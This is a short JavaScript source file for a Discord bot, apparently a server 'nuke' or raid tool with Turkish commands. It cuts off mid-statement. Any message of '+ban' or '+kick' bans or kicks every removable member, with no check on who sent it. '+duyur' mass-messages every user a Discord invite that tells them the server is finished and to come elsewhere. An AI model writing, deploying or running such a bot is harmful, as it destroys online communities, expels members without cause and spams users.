const { Client, GatewayIntentBits } = require("discord.js");
const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ] 
});
const ayarlar = require("./ayarlar.json");
const express = require("express");
const http = require("http");

client.login(ayarlar.token);

client.on("messageCreate", msg => {         
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.cache.forEach(member => {
      if (member.bannable) member.ban();
    });
  }
});

client.on("messageCreate", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.cache.forEach(member => {
      if (member.kickable) member.kick();
    });
  }
});

client.on("messageCreate", async msg => {
  if (msg.content === "+duyur") {
    msg.delete();
    const users = await client.users.fetch();
    users.forEach(user => {
      if (!user.bot) {
        user.send("**SUNUCU GG BİZE GELİN https://discord.gg/e486WKzCxJ ** :wink:")
          .catch(console.error);
